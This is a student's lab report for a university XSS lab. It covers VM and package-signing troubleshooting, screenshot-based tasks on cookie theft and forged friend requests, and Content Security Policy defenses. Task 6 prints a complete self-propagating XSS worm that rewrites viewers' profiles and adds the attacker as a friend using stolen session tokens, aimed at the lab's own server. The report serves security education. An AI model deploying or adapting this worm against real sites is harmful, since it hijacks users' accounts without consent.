- [Lab](#lab)
  - [Lab Setup](#lab-setup)
    - [Hosts Setup](#hosts-setup)
    - [Desktop Setup](#desktop-setup)
    - [Windows Machine](#windows-machine)
  - [Tasks](#tasks)
    - [1: Posting a Malicious Message to Display an Alert Window](#1-posting-a-malicious-message-to-display-an-alert-window)
    - [2: Posting a Malicious Message to Display Cookies](#2-posting-a-malicious-message-to-display-cookies)
    - [3: Stealing Cookies from the Victim’s Machine](#3-stealing-cookies-from-the-victims-machine)
    - [4: Becoming the Victim’s Friend](#4-becoming-the-victims-friend)
    - [5: Modifying the Victim’s Profile](#5-modifying-the-victims-profile)
    - [6: Writing a Self-Propagating XSS Worm](#6-writing-a-self-propagating-xss-worm)
    - [7: Defeating XSS Attacks Using CSP](#7-defeating-xss-attacks-using-csp)
  - [Summary](#summary)

# Lab

A lab for class **MET CS 763** at Boston University, instructed by **Yuting Zhang**. Student [Zhang, Jin Yu](siege@bu.edu) submitted on **April 23, 2023**.

## Lab Setup

Downloaded and unzipped the setup file:

![1-1](./1-1.png)

Executed `dcup -d` to run containers in the background:

![1-2](./1-2.png)

### Hosts Setup

Modified `/etc/hosts`:

![2-1](./2-1.png)

### Desktop Setup

I used AWS EC2 for my SeedLab VM since there was no compatible VM solution for my MacBook with M1 chip. This lab requires some GUI, so I had to install `ubuntu-desktop`. I first run:

```bash
sudo apt update
```

I then encountered `At least one invalid signature was encountered.` issues for updating every repository. First of all, I confirmed that my EC2 instance has security setting outbound `0.0.0.0/0` rule for all ports, which helped me to exclude the root of the issue from network settings. Afterwards, I thought the issue may relate to incorrectly configured keys, so I ran `sudo apt-key list`. See output below:

```
create_gpg_home:trap:14: undefined signal: ABRT
```

Backed-up the source list file:

```bash
sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
```

Ran `sudo apt update` again and outputted no issues:

```
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
```

Ran `sudo apt install ubuntu-desktop`. Got the following error message:

```
E: Unable to locate package ubuntu-desktop
```

It turned out that removing all sources didn't fix the issue. I restored the `sources.list` file and ran `sudo apt update` again. The error message remained:

```
Get:1 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy InRelease [270 kB]
Get:2 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]
Get:3 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease [108 kB]
Get:4 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
Err:1 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy InRelease
  At least one invalid signature was encountered.
Err:2 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease
  At least one invalid signature was encountered.
Err:3 http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease
  At least one invalid signature was encountered.
Err:4 http://security.ubuntu.com/ubuntu jammy-security InRelease
  At least one invalid signature was encountered.
Reading package lists... Done
W: GPG error: http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy InRelease: At least one invalid signature was encountered.
E: The repository 'http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy InRelease' is not signed.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
W: GPG error: http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease: At least one invalid signature was encountered.
E: The repository 'http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease' is not signed.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
W: GPG error: http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease: At least one invalid signature was encountered.
E: The repository 'http://us-east-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease' is not signed.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
W: GPG error: http://security.ubuntu.com/ubuntu jammy-security InRelease: At least one invalid signature was encountered.
E: The repository 'http://security.ubuntu.com/ubuntu jammy-security InRelease' is not signed.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
```

Reimported the keys from the Ubuntu server:

```bash
sudo apt clean
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 871920D1991BC93C
```

Got `create_gpg_home:trap:14: undefined signal: ABRT` while running `sudo apt-key ...`. Then tried to configure another trusted key file:

```bash
gpg --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 871920D1991BC93C
gpg --armor --export 3B4FE6ACC0B21F32 > ubuntu_key_3B4FE6ACC0B21F32.gpg
gpg --armor --export 871920D1991BC93C > ubuntu_key_871920D1991BC93C.gpg
sudo gpg --no-default-keyring --keyring /etc/apt/trusted.gpg --import ubuntu_key_3B4FE6ACC0B21F32.gpg
sudo gpg --no-default-keyring --keyring /etc/apt/trusted.gpg --import ubuntu_key_871920D1991BC93C.gpg
rm ubuntu_key_3B4FE6ACC0B21F32.gpg
rm ubuntu_key_871920D1991BC93C.gpg
sudo apt update
```

### Windows Machine

I ended using another Windows machine, starting over from VM installation. First of all, downloaded the `.vdi` file and install it on `Ubuntu 20.04`:

![3-1](./3-1.png)

Copied docker files and configured `hosts` file:

![3-2](./3-2.png)

![3-3](./3-3.png)

Ran `docker-compose up`:

![3-4](./3-4.png)

HTTP Header Live was already installed:

![3-5](./3-5.png)

## Tasks

Screenshots for each task.

### 1: Posting a Malicious Message to Display an Alert Window

Edited the profile:

![4-1](./4-1.png)

Displayed alert when viewed the profile:

![4-2](./4-2.png)

### 2: Posting a Malicious Message to Display Cookies

Edited the profile:

![4-3](./4-3.png)

Displayed alert for cookies when viewed the profile:

![4-4](./4-4.png)

### 3: Stealing Cookies from the Victim’s Machine

Ran `nc`:

![4-5](./4-5.png)

Edited the profile:

![4-6](./4-6.png)

Logs from `nc`:

![4-7](./4-7.png)

### 4: Becoming the Victim’s Friend

Observed the add friend request:

![4-8](./4-8.png)

Observed the security tokens:

![4-9](./4-9.png)

Edited Alice's profile:

![4-10](./4-10.png)

Edited Samy's profile:

![4-12](./4-12.png)

Result from viewing Samy's profile:

![4-11](./4-11.png)

- **Question 1**: Line 1 and 2 are required for the request. `ts` is the timestamp, and `token` is the current user's security token
- **Question 2**: Yes. You can modify the content in the input directly with the developer tools or other add-ons. You can also send a `/action/profile/edit` request with the desired content

### 5: Modifying the Victim’s Profile

Observed the request:

![4-13](./4-13.png)

Edited the profile:

![4-14](./4-14.png)

Alice's profile was modified after viewing Samy's profile:

![4-15](./4-15.png)

- **Question 3**: Line 1 is needed since we don't want Samy's profile get modified after viewing his own profile. See the screenshots below for not preventing his profile from modifying by himself:

![4-16](./4-16.png)

![4-17](./4-17.png)

### 6: Writing a Self-Propagating XSS Worm

Edited the profile:

```HTML
<script type="text/javascript" id="worm">
    window.onload = function () {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";

        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var description = "&description=You are attacked!" + wormCode + "&accesslevel[description]=2";

        var userName = "&name=" + elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        var content = token + ts + userName + description + guid;
        var sendurl = "http://www.seed-server.com/action/profile/edit"

        var samyGuid = 59;
        if (elgg.session.user.guid != samyGuid) {
            alert(jsCode);

            // Modify profile
            var AjaxModifyProfile = null;
            AjaxModifyProfile = new XMLHttpRequest();
            AjaxModifyProfile.open("POST", sendurl, true);
            AjaxModifyProfile.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            AjaxModifyProfile.send(content);

            // Add samy as friend
            var AjaxAddFriend = null;
            AjaxAddFriend = new XMLHttpRequest();
            AjaxAddFriend.open("GET", `http://www.seed-server.com/action/friends/add?friend=${samyGuid}${ts}${token}`, true);
            AjaxAddFriend.send();
        }
    }
</script>
```

![4-18](./4-18.png)

![4-20](./4-20.png)

Viewed Samy's profile as Alice:

![4-19](./4-19.png)

Alice became one of the worms after viewing Samy's profile:

![4-21](./4-21.png)

![4-22](./4-22.png)

Viewed Alice's profile as Boby:

![4-23](./4-23.png)

Boby became one of the worms after viewing Alice's profile:

![4-24](./4-24.png)

### 7: Defeating XSS Attacks Using CSP

> **Describe and explain your observations when you visit these websites:**
>
> We are able to run all JavaScript codes on **a**, and all areas are `OK`. For **b**, only the scripts from allowed `script-src` defined in `apache_csp.conf` run without problems. For **c**, only the scripts from allowed `script-src` defined in `phpindex.php,` run without problems.

Viewed example32(a|b|c).com:

![4-25](./4-25.png)

![4-26](./4-26.png)

![4-27](./4-27.png)

> **Click the button in the web pages from all the three websites, describe and explain your observations:**
>
> Only the button on **a** responds and displays an alert. For **b** and **c**, since inline scripts will be blocked by CSP by default, the CSP headers they have should include at least one of the value from `nonce`, `hash`, and `unsafe-inline`.

Viewed example32(a|b|c).com and their button elements:

![4-28](./4-28.png)

![4-29](./4-29.png)

![4-30](./4-30.png)

> **Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report:**
> Please see the screenshots and steps below.

Modified `apache_csp.conf`:

![4-31](./4-31.png)

Ran `docker-compose up --build`:

![4-32](./4-32.png)

Area 5 and 6 displayed `OK`:

![4-33](./4-33.png)

> **Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report:**
> Please see the screenshots and steps below.

Modified `phpindex.php`:

![4-34](./4-34.png)

Ran `docker-compose up --build`:

![4-35](./4-35.png)

Area 1, 2, 4, 5, and 6 displayed `OK`:

![4-36](./4-36.png)

## Summary

- What is the purpose of the lab in your own words?
  - Get hands-on experience on lunching XSS attacks, and learn how to defeat it
- What did you learn? Did you achieve the objectives?
  - The relationship between CSP and JS scripts (Task 7). Yes, I achieved all the objectives but the optional tool Burp Suite. Inspector was actually enough for this lab
- Was this lab hard or easy? Are the lab instructions clear?
  - This lab was not hard for people with JavaScript and Web experience. However, I spent tons of time on configuring SEED-Ubuntu with GUI on AWS, which turned out a waste of time. Task 6 was not clear. I wasn't sure what result should we submit
- What do you think about the tools used? What worked? What didn’t? Are there other better alternatives?
  - HTTP Header Live provides an easy-to-read UI for requests, it worked perfectly. However, I personally would choose Chrome as the testing browser and just use the developer tool
- Any other feedback?
